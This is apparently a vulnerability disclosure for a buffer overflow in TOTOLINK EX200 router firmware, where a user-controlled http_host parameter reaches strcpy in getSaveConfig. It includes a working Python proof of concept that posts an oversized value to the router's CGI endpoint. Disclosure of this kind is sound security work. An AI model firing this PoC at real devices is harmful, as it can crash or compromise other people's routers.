## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/data/upload/20210428/7979e841521515eb83b45aacf5b67f9a.zip

## Affected version

EX200 V4.0.3c.7646_B20201211

## Vulnerability details

In the EX200 V4.0.3c.7646_B20201211 firmware has a buffer overflow vulnerability in the `getSaveConfig` function. The `v6` variable receives the `http_host` parameter from a POST request. However, since the user can control the input of `http_host`, the statement `strcpy((char *)v13, v6);` can cause a buffer overflow vulnerability.

![image-20240719230945874](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719230945874.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi?action=save&setting"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {"http_host":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240720233918538](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240720233918538.png)
